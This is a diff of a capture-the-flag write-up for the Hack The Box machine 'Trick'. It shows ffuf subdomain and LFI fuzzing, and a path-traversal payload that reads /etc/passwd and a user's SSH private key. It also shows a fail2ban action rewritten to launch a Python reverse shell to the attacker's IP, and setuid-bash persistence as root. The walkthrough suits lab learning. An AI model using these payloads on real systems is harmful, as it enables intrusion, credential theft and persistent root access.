@@ -98,24 +98,60 @@ Note: The password did not do anything for me. This whole page was another rabbi
 
 ![image](https://user-images.githubusercontent.com/105310322/188243610-f96f4f5a-2d41-4896-86dd-f7793cddf920.png)
 
+Since I was not getting anywhere I decided to try and find more sub domains based off of preprod and there happened to be another hiding!
+
+```
+└──╼ [★]$ ffuf -w /usr/share/wordlists/wfuzz/general/big.txt -u http://preprod-FUZZ.trick.htb -v -fs 0
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive <3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://preprod-FUZZ.trick.htb
+ :: Wordlist         : FUZZ: /usr/share/wordlists/wfuzz/general/big.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response size: 0
+________________________________________________
+
+[Status: 200, Size: 9660, Words: 3007, Lines: 179]
+| URL | http://preprod-marketing.trick.htb
+    * FUZZ: marketing
+```
 
 
-Add preprod-marketing.trick.htb to /etc/hosts
+Lets add ```preprod-marketing.trick.htb``` to ```/etc/hosts```
 
-Takes us to marketing
+Navigating it takes us to marketing which also doesnt have much going on.
 
 ![image](https://user-images.githubusercontent.com/105310322/188242703-983bfebe-f7bb-4ef3-a32a-79b5fb39340a.png)
-```
-└──╼ [★]$ ffuf -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u http://preprod-marketing.trick.htb/index.php?page=FUZZ -v -fs 0
-```
-....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
 
+However we can check for any LFI vulnerabilites.
 
-Gives us a user Michael
+Note: I had to update/Install Seclists for this to work since Pwnbox does not come with an up to date seclists....
+
+```
+└──╼ [★]$ ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u http://preprod-marketing.trick.htb/index.php?page=FUZZ -v -fs 0
+```
+Alot gets outputted so we will just use this line here and place it at the end of the URL like so ```http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd```
+
+This page reveals that we have a user michael! Lets see if we can get ssh keys.
 
 ![image](https://user-images.githubusercontent.com/105310322/188243801-a2869c4c-48cc-4546-af41-64db271c9884.png)
 
-....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//home/michael/.ssh/id_rsa
+```....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//home/michael/.ssh/id_rsa```
+
+Awesome we have a way in!
 
 ```console
 -----BEGIN OPENSSH PRIVATE KEY----- 
@@ -171,7 +207,7 @@ michael@trick:~$
 
 Now this next part is a little tricky and requires abusing fail2ban. Which is also a pretty neat way to gain root. The way fail2ban works is that it will ban an ip from accessing the network after a certain amount of ailed attempts. Instead we are going to make it run a reverse shell after an amount of incorrect logins.
 
-Note: With how fail2ban works, you only get about 1 minute as root
+Note: With how fail2ban works, you only get about 1 minute as root, But you can gain persistence as shown at the end of the writeup.
 
 ```console
 michael@trick:~$ sudo -l
@@ -193,7 +229,7 @@ I tried a bunch of different reverse shells but they kept failing to connect. Fi
 ```console
 actionban = export RHOST="10.10.14.35";export RPORT=1234;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")' 
 ```
-After editing ve sure to have your nc listener ready and mv the file back and restart the fail2ban service.
+After editing be sure to have your nc listener ready and move the file back and restart the fail2ban service.
 
 ```
 michael@trick:/tmp$ mv iptables-multiport.conf /etc/fail2ban/action.d/
@@ -242,3 +278,17 @@ Another thing we can do is as soon as you gain root access is to create persiste
 cd /tmp
 # chmod u+s bash
 ```
+Then as michael run bash out of /tmp
+
+Note: the -p is required for the euid=0(root) otherwise you are just launching the shell as michael.
+
+```
+michael@trick:/tmp$ ./bash -p
+bash-5.0# id
+uid=1001(michael) gid=1001(michael) euid=0(root) groups=1001(michael),1002(security)
+bash-5.0# 
+```
+
+Awesome we got both flags and learned a little about persistence. I also tried ssh keys as root which I am sure should work but I kept getting problems logging in. Added public keys to authorized_keys file and edited ssh_config and sshd_config in conjuction with systemctl restart ssh but None of my keys were working still. Try again another time.
+
+GG!
